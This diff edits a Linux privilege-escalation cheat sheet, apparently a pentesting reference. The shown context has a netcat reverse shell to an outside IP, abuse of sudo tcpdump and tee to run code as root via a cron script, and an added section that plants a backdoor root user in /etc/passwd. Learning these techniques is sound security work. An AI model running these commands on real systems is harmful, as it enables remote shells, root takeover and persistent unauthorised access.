@@ -267,7 +267,7 @@ id
 /bin/nc 192.168.110.1 4444 -e /bin/bash
 ```
 
- Execute the command
+Execute the command
 
 ```
 sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./temp.sh -Z root
@@ -361,7 +361,7 @@ and then
 cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
 ```
 
- which will add contents of temp.sh to tidyup.sh. \( Assuming tidyup.sh is running as root by crontab \)
+which will add contents of temp.sh to tidyup.sh. \( Assuming tidyup.sh is running as root by crontab \)
 
 [How I got root with sudo/](https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/)
 
@@ -381,6 +381,20 @@ find / -perm -o x -type d 2>/dev/null
 # World writable and executable folders
 find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
 ```
+
+#### Can write to /etc/passwd
+
+Can add a user with root permissions
+
+```
+#Generate a password to include in /etc/passwd; example salt is lulz, password is letmein, and user is plz
+openssl passwd -1 -salt lulz letmein
+#$1$lulz$TNLkd169ZEm7OHQx.1M060
+#edit /etc/passwd
+plz:$1$lulz$TNLkd169ZEm7OHQx.1M060:0:0:root:/root:/bin/bash
+```
+
+
 
 ### Bad path configuration
 
